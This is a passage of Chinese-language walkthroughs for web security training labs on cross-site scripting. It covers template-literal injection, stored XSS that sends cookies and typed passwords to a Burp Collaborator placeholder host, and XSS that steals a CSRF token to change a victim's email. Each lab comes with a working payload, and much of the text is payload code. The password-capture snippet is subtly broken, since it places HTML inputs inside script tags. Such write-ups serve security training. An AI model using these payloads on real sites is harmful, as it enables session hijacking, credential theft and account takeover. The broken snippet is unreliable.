- **注入点**：搜索参数`search`，被嵌入到JavaScript模板字面量中，通过`document.getElementById`更新页面内容。
    
- **利用方式**：提交`${alert(1)}`，由于`${}`是模板字面量的原生语法，其中的表达式会被执行，无需闭合引号或转义任何字符。
    
- **为什么用`${}`**：模板字面量使用反引号（`` ` ``）包裹，`${}`作为插值标识，可嵌入任意JavaScript表达式。因为服务端未转义`$`和`{`，攻击者利用此语法直接执行代码。
    
- **为什么未被过滤**：服务端只转义了常见的特殊字符（尖括号、引号、反斜杠、反引号），但忽略了`${}`组合，导致过滤不完整。
    
- **测试方法**：在Burp中修改`search`参数为`${alert(1)}`，观察页面是否弹出警告框；也可直接在浏览器地址栏测试。

```js
// 输入<''> 发现全被转义
<script>
	var message = `0 search results for '\u003c\u0027\u0027\u003e'`;
	document.getElementById('searchMessage').innerText = message;
</script>

// ${}未被过滤
<script>
    var message = `1 search results for '${'`;
    document.getElementById('searchMessage').innerText = message;
</script>
```

```js
${alert(1)}
```

# Lab: Exploiting cross-site scripting to steal cookies

该漏洞属于存储型XSS，攻击者在评论区注入恶意JavaScript脚本，当其他用户（包括管理员）访问页面时，脚本在受害者浏览器中自动执行。脚本通过`fetch`向攻击者控制的Burp Collaborator服务器发送POST请求，并将`document.cookie`作为请求体外传。攻击者随后可窃取受害者会话Cookie，实现会话劫持。

- **注入点**：评论内容的`comment`字段（POST请求），数据持久化存储并在页面渲染时嵌入。
    
- **利用方式**：提交包含`<script>fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {method:'POST', mode:'no-cors', body:document.cookie});</script>`的评论，所有访客访问时触发。
    
- **与同类漏洞区别**：常规存储XSS用于弹窗或页面篡改，本场景聚焦于**数据外带（Exfiltration）**，利用`fetch`跨域发送敏感数据。`mode:'no-cors'`确保请求成功发送（尽管无法读取响应），适合仅需单向数据传输的场景。
    
- **测试方法**：在Burp中拦截评论提交，修改`comment`参数为恶意脚本，提交后访问页面，查看Burp Collaborator是否收到包含Cookie的请求。

```js
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

# Lab: Exploiting cross-site scripting to capture passwords

该漏洞属于存储型XSS，攻击者在评论区注入恶意HTML/JavaScript，动态创建伪造的登录表单（用户名和密码输入框）并插入页面。当受害者在密码框中输入内容时，`onchange`事件触发，脚本通过`fetch`将输入的用户名和密码拼接后发送至Burp Collaborator服务器。攻击者借此实时捕获用户输入的明文密码。

- **注入点**：评论内容的`comment`字段（POST请求），数据持久化存储。
    
- **利用方式**：提交包含`<input name=username id=username><input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{method:'POST',mode:'no-cors',body:username.value+':'+this.value});">`的评论，诱导用户输入密码。
    
- **与同类漏洞区别**：此攻击不仅外带现有数据，还**主动捕获用户交互时输入的新数据**，比窃取Cookie更具欺骗性，常用于凭证窃取。
    
- **测试方法**：提交恶意评论后，访问页面，在伪造的表单中输入测试用户名和密码，观察Burp Collaborator是否收到包含该数据的请求。

```js
<script>
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
</script>
```

# Lab: Exploiting XSS to bypass CSRF defenses

该漏洞属于存储型XSS，攻击者在评论区注入恶意JavaScript脚本。当受害者（通常是管理员）访问页面时，脚本自动执行，首先通过`XMLHttpRequest`请求`/my-account`页面，从响应中解析出CSRF令牌（`name="csrf" value="..."`），然后构造第二个请求，将CSRF令牌和攻击者控制的邮箱地址一并提交至`/my-account/change-email`，从而在受害者不知情的情况下修改其账户邮箱。此攻击利用XSS窃取CSRF令牌，绕过了基于令牌的CSRF防护机制。

- **注入点**：评论内容的`comment`字段（POST请求），数据持久化存储，存储型XSS。
    
- **利用方式**：提交包含恶意脚本的评论，脚本分两步：① 获取`/my-account`页面并正则提取CSRF令牌；② 使用该令牌发起邮箱修改请求，将受害者邮箱改为攻击者控制的地址。
    
- **与同类漏洞区别**：常规XSS用于弹窗或窃取Cookie，本场景结合CSRF防护的缺陷，通过XSS窃取令牌并以受害者身份执行敏感操作（更改邮箱），可导致账户完全被接管。
    
- **测试方法**：在Burp中拦截评论提交，插入恶意脚本，提交后访问页面，检查账户邮箱是否被修改。通过Collaborator或日志验证脚本执行情况。

```js
<script>
var req = new XMLHttpRequest(); 
req.onload = handleResponse; 
req.open('get','/my-account',true); 
req.send(); 
function handleResponse() { 
	var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; 
	var changeReq = new XMLHttpRequest(); 
	changeReq.open('post', '/my-account/change-email', true); 
	changeReq.send('csrf='+token+'&email=test@test.com') }; 
</script>
```